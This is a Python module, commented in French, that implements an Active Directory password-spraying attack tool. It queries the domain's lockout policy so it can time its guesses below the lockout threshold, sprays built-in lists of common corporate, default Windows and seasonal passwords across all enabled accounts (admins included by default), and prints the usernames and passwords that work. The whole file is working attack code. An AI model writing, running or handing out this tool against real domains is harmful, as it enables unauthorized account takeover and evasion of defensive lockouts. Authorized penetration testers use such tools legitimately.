"""AD Password Spraying — pulvérisation intelligente de mots de passe.

Effectue une attaque par pulvérisation (spraying) en respectant
les politiques de verrouillage de compte pour éviter les lockouts.

Fonctionnalités :
- Détection automatique du seuil de verrouillage
- Spray intelligent : 1 mot de passe × N utilisateurs
- Délais configurables entre tentatives
- Wordlists intégrées (saisonnières, par défaut, communes)
- Rapport des comptes compromis
- Mode simulation (dry-run)

Usage:
    sprayer = PasswordSprayer(connector)
    sprayer.set_wordlist(["Password1", "Summer2024", "Company@123"])
    results = await sprayer.spray(domain_map.users)
    for r in results:
        if r.success:
            print(f"✓ {r.username}:{r.password}")
"""

import asyncio
from dataclasses import dataclass, field
from enum import StrEnum

import structlog

logger = structlog.get_logger(__name__)


# ── Wordlists intégrées ───────────────────────────────────────

# Saisonnières (mise à jour automatique selon le mois)
SEASONAL_PASSWORDS = {
    1: ["Winter2026", "January2026", "HappyNewYear2026", "Jan@2026"],
    2: ["Winter2026", "February2026", "Valentine2026", "Feb@2026"],
    3: ["Spring2026", "March2026", "Mar@2026"],
    4: ["Spring2026", "April2026", "Apr@2026"],
    5: ["Spring2026", "May2026", "May@2026"],
    6: ["Summer2026", "June2026", "Jun@2026"],
    7: ["Summer2026", "July2026", "Jul@2026"],
    8: ["Summer2026", "August2026", "Aug@2026"],
    9: ["Fall2026", "September2026", "Sep@2026"],
    10: ["Fall2026", "October2026", "Oct@2026"],
    11: ["Fall2026", "November2026", "Nov@2026"],
    12: ["Winter2026", "December2026", "Dec@2026"],
}


# Top 30 mots de passe les plus communs en entreprise
COMMON_CORPORATE_PASSWORDS = [
    "Password1",
    "Password123",
    "Welcome1",
    "Welcome123",
    "Company@123",
    "Company1",
    "Corp@2024",
    "Corp@2025",
    "P@ssw0rd",
    "P@ssw0rd123",
    "Changeme",
    "ChangeMe123",
    "Admin123",
    "Admin@123",
    "Qwerty123",
    "Qwerty@123",
    "Summer2024",
    "Summer2025",
    "Summer2026",
    "Winter2024",
    "Winter2025",
    "Winter2026",
    "Spring2024",
    "Spring2025",
    "Spring2026",
    "Password!",
    "Password@123",
    "Letmein123",
    "Monday123",
    "Friday123",
]

# Top 15 mots de passe par défaut de produits Microsoft/Windows
DEFAULT_WINDOWS_PASSWORDS = [
    "Passw0rd",
    "P@ssw0rd",
    "Windows10",
    "Windows11",
    "Win@2025",
    "Temp1234",
    "Temp@1234",
    "Default123",
    "NewUser123",
    "User@123",
    "Setup123",
    "Install123",
    "P@ss1234",
    "Server2019",
    "Server2022",
]


class SprayMode(StrEnum):
    """Mode de pulvérisation."""

    SAFE = "safe"  # 1 tentative / 30 min (défaut)
    NORMAL = "normal"  # 1 tentative / 5 min
    AGGRESSIVE = "aggressive"  # 1 tentative / 30 sec (risque lockout)
    CUSTOM = "custom"  # Délai personnalisé


@dataclass
class SprayConfig:
    """Configuration du sprayer."""

    mode: SprayMode = SprayMode.SAFE
    delay_seconds: float = 1800.0  # Délai entre 2 tentatives (SAFE = 30min)
    max_attempts_before_rest: int = 3  # Pause après N tentatives
    rest_duration_seconds: float = 600.0  # Durée de la pause (10 min)
    lockout_threshold: int = 0  # 0 = auto-détecter
    lockout_window_minutes: int = 30  # Fenêtre d'observation lockout
    avoid_disabled: bool = True  # Ignorer les comptes désactivés
    avoid_admin: bool = False  # ⚠️ Ignorer les comptes admin (OFF par défaut)
    target_users: list[str] = field(default_factory=list)  # SAMs spécifiques
    dry_run: bool = False  # Mode simulation

    @property
    def effective_delay(self) -> float:
        """Délai effectif selon le mode."""
        mode_delays = {
            SprayMode.SAFE: 1800.0,
            SprayMode.NORMAL: 300.0,
            SprayMode.AGGRESSIVE: 30.0,
        }
        if self.mode != SprayMode.CUSTOM:
            return mode_delays.get(self.mode, 1800.0)
        return self.delay_seconds


@dataclass
class SprayResult:
    """Résultat d'une tentative de pulvérisation."""

    username: str
    password: str
    success: bool = False
    error: str | None = None
    timestamp: str = ""
    attempt_number: int = 0


@dataclass
class SpraySession:
    """Session complète de pulvérisation."""

    config: SprayConfig
    total_users: int = 0
    total_passwords: int = 0
    total_attempts: int = 0
    successes: list[SprayResult] = field(default_factory=list)
    failures: int = 0
    errors: int = 0
    lockouts_detected: int = 0
    duration_seconds: float = 0.0
    aborted: bool = False
    abort_reason: str = ""

    @property
    def success_rate(self) -> float:
        if self.total_attempts == 0:
            return 0.0
        return len(self.successes) / self.total_attempts

    def summary(self) -> str:
        lines = [
            "=== Password Spray Results ===",
            f"Users tested: {self.total_users}",
            f"Passwords tried: {self.total_passwords}",
            f"Total attempts: {self.total_attempts}",
            f"Successes: {len(self.successes)}",
            f"Failures: {self.failures}",
            f"Lockouts detected: {self.lockouts_detected}",
            f"Duration: {self.duration_seconds:.1f}s",
        ]
        if self.aborted:
            lines.append(f"ABORTED: {self.abort_reason}")
        if self.successes:
            lines.append("\nSuccessful logins:")
            for r in self.successes:
                lines.append(f"  ✓ {r.username} : {r.password}")
        return "\n".join(lines)


# ── Password Sprayer ──────────────────────────────────────────


class PasswordSprayer:
    """Pulvérisateur de mots de passe intelligent.

    Effectue du password spraying en respectant les lockout policies
    pour éviter de verrouiller les comptes.

    Usage:
        sprayer = PasswordSprayer(connector, config=SprayConfig(mode=SprayMode.SAFE))
        sprayer.set_wordlist(["Summer2026", "Company@123"])
        session = await sprayer.spray_user_list(user_list)
        print(session.summary())
    """

    def __init__(self, connector=None, config: SprayConfig | None = None) -> None:
        """Args:
        connector: ADConnector actif
        config: Configuration de spray.

        """
        self.connector = connector
        self.config = config or SprayConfig()
        self._wordlist: list[str] = []
        self._lockout_threshold: int = 0
        self._lockout_counter: int = 0

    # ── Configuration ──────────────────────────────────────────

    def set_wordlist(self, passwords: list[str]) -> None:
        """Définit la wordlist de mots de passe à tester."""
        self._wordlist = list(dict.fromkeys(passwords))  # déduplication
        logger.info("wordlist_set", count=len(self._wordlist))

    def load_default_wordlist(self, include_seasonal: bool = True) -> None:
        """Charge la wordlist par défaut (entreprise + Windows).

        Args:
            include_seasonal: Inclure les mots de passe saisonniers

        """
        import datetime

        passwords = list(COMMON_CORPORATE_PASSWORDS)
        passwords.extend(DEFAULT_WINDOWS_PASSWORDS)

        if include_seasonal:
            month = datetime.datetime.now().month
            passwords.extend(SEASONAL_PASSWORDS.get(month, []))
            # Mois précédent
            prev_month = 12 if month == 1 else month - 1
            passwords.extend(SEASONAL_PASSWORDS.get(prev_month, []))

        self._wordlist = list(dict.fromkeys(passwords))  # déduplication
        logger.info("default_wordlist_loaded", count=len(self._wordlist))

    def load_wordlist_file(self, path: str) -> int:
        """Charge une wordlist depuis un fichier (1 mot de passe par ligne).

        Args:
            path: Chemin du fichier

        Returns:
            Nombre de mots de passe chargés

        """
        with open(path, encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        self._wordlist = list(dict.fromkeys(passwords))
        logger.info("wordlist_file_loaded", path=path, count=len(self._wordlist))
        return len(self._wordlist)

    # ── Spray ──────────────────────────────────────────────────

    async def spray_all_users(self, domain_map) -> SpraySession:
        """Spray sur tous les utilisateurs du domaine.

        Args:
            domain_map: DomainMap issue de l'énumérateur

        Returns:
            SpraySession avec les résultats

        """
        users = domain_map.users
        return await self.spray_user_list(users)

    async def spray_user_list(self, users: list) -> SpraySession:
        """Spray sur une liste d'utilisateurs.

        Args:
            users: Liste d'ADUser ou de dicts {username, ...}

        Returns:
            SpraySession avec les résultats

        """
        import time

        if not users:
            msg = "Liste d'utilisateurs vide"
            raise ValueError(msg)

        if not self._wordlist:
            self.load_default_wordlist()

        if not self._wordlist:
            msg = "Liste de mots de passe vide"
            raise ValueError(msg)

        if not self.connector:
            msg = "PasswordSprayer requires an active ADConnector"
            raise ValueError(msg)

        # ── Préparer la liste d'utilisateurs ────────────────────
        user_list = self._prepare_user_list(users)
        if not user_list:
            return SpraySession(
                config=self.config,
                aborted=True,
                abort_reason="No valid users to spray",
            )

        # ── Détecter le seuil de lockout ───────────────────────
        if self.config.lockout_threshold == 0:
            self._lockout_threshold = await self._detect_lockout_threshold()
        else:
            self._lockout_threshold = self.config.lockout_threshold

        logger.info(
            "spray_starting",
            users=len(user_list),
            passwords=len(self._wordlist),
            lockout_threshold=self._lockout_threshold,
            mode=self.config.mode,
            dry_run=self.config.dry_run,
        )

        session = SpraySession(
            config=self.config,
            total_users=len(user_list),
            total_passwords=len(self._wordlist),
        )
        t_start = time.monotonic()

        # ── Boucle de spray ────────────────────────────────────
        attempt_count = 0
        for password in self._wordlist:
            for user_info in user_list:
                session.total_attempts += 1
                attempt_count += 1

                if self.config.dry_run:
                    # RÈGLE CRITIQUE : ne jamais logger le mot de passe
                    logger.info("dry_run_attempt", user=user_info["username"])
                    continue

                try:
                    result = await self._try_login(
                        user_info["username"],
                        password,
                        attempt_count,
                    )
                    if result.success:
                        session.successes.append(result)
                        logger.info("spray_success", user=result.username, attempt=attempt_count)
                    else:
                        session.failures += 1
                except Exception as e:
                    session.errors += 1
                    logger.exception("spray_error", user=user_info["username"], error=str(e))

                # ── Gestion du délai ───────────────────────────
                delay = self.config.effective_delay
                if attempt_count % self.config.max_attempts_before_rest == 0:
                    logger.info("taking_rest", duration=self.config.rest_duration_seconds)
                    if not self.config.dry_run:
                        await asyncio.sleep(self.config.rest_duration_seconds)
                elif delay > 0:
                    if not self.config.dry_run:
                        await asyncio.sleep(delay)

                # ── Vérifier les lockouts ──────────────────────
                if self._lockout_counter >= self._lockout_threshold * 0.8:
                    session.lockouts_detected = self._lockout_counter
                    logger.warning(
                        "lockout_risk_high",
                        count=self._lockout_counter,
                        threshold=self._lockout_threshold,
                    )
                    # Pause longue pour laisser la fenêtre de lockout expirer
                    if not self.config.dry_run:
                        pause = (
                            self.config.lockout_window_minutes * 60
                            - self.config.rest_duration_seconds
                        )
                        if pause > 0:
                            await asyncio.sleep(pause)

        session.duration_seconds = time.monotonic() - t_start
        logger.info("spray_complete", successes=len(session.successes), failures=session.failures)

        return session

    async def spray_specific_user(self, username: str) -> SpraySession:
        """Spray ciblé sur un seul utilisateur.

        ⚠️ ATTENTION : Risque élevé de lockout ! Préférer spray_user_list
        avec un seul utilisateur et une wordlist très réduite.

        Args:
            username: sAMAccountName de la cible

        Returns:
            SpraySession

        """
        return await self.spray_user_list([{"username": username}])

    # ── Internes ───────────────────────────────────────────────

    def _prepare_user_list(self, users: list) -> list[dict]:
        """Prépare et filtre la liste d'utilisateurs."""
        user_list = []

        for user in users:
            # Extraire les infos (supporte ADUser et dict)
            if hasattr(user, "sam_account_name"):
                username = user.sam_account_name
                enabled = user.is_enabled
                is_admin = user.is_admin
            elif isinstance(user, dict):
                username = user.get("username", user.get("sam_account_name", ""))
                enabled = user.get("enabled", True)
                is_admin = user.get("is_admin", False)
            else:
                continue

            if not username:
                continue

            # Filtres
            if self.config.avoid_disabled and not enabled:
                continue
            if self.config.avoid_admin and is_admin:
                continue
            if self.config.target_users and username not in self.config.target_users:
                continue

            user_list.append(
                {
                    "username": username,
                    "enabled": enabled,
                    "is_admin": is_admin,
                },
            )

        return user_list

    async def _try_login(
        self,
        username: str,
        password: str,
        attempt: int,
    ) -> SprayResult:
        """Teste un couple username/password."""
        from datetime import datetime

        if self.config.dry_run:
            return SprayResult(
                username=username,
                password=password,
                success=False,
                attempt_number=attempt,
                timestamp=datetime.now().isoformat(),
            )

        try:
            success = await self.connector.test_credentials(
                username,
                password,
            )
            if not success:
                self._lockout_counter += 1
            else:
                self._lockout_counter = 0  # Reset counter on success

            return SprayResult(
                username=username,
                password=password,
                success=success,
                attempt_number=attempt,
                timestamp=datetime.now().isoformat(),
            )
        except Exception as e:
            return SprayResult(
                username=username,
                password=password,
                success=False,
                error=str(e),
                attempt_number=attempt,
                timestamp=datetime.now().isoformat(),
            )

    async def _detect_lockout_threshold(self) -> int:
        """Détecte le seuil de verrouillage du domaine.

        Interroge la politique de domaine pour déterminer combien
        de tentatives échouées sont autorisées avant lockout.

        Returns:
            Seuil détecté (défaut: 5 si non détecté)

        """
        if not self.connector or not self.connector.is_connected:
            return 5  # Valeur par défaut raisonnable

        try:
            # Chercher la politique de mot de passe du domaine
            entries = await self.connector.search(
                "(objectClass=domainDNS)",
                scope="base",
                attributes=["lockoutThreshold", "lockoutDuration", "lockoutObservationWindow"],
            )

            if entries:
                attrs = entries[0].get("attributes", {})
                threshold = int(attrs.get("lockoutThreshold", [0])[0] or 0)
                if threshold > 0:
                    logger.info("lockout_threshold_detected", threshold=threshold)
                    return threshold
        except Exception as e:
            logger.warning("lockout_detection_failed", error=str(e))

        # Fallback: valeur par défaut Windows
        logger.info("lockout_threshold_default", threshold=5)
        return 5


# ── Fonctions utilitaires ─────────────────────────────────────


def get_seasonal_wordlist() -> list[str]:
    """Retourne la wordlist saisonnière pour le mois courant."""
    import datetime

    month = datetime.datetime.now().month
    return SEASONAL_PASSWORDS.get(month, [])


def get_full_default_wordlist() -> list[str]:
    """Retourne la wordlist complète par défaut (dédupliquée)."""
    import datetime

    passwords = list(COMMON_CORPORATE_PASSWORDS)
    passwords.extend(DEFAULT_WINDOWS_PASSWORDS)
    month = datetime.datetime.now().month
    passwords.extend(SEASONAL_PASSWORDS.get(month, []))
    return list(dict.fromkeys(passwords))
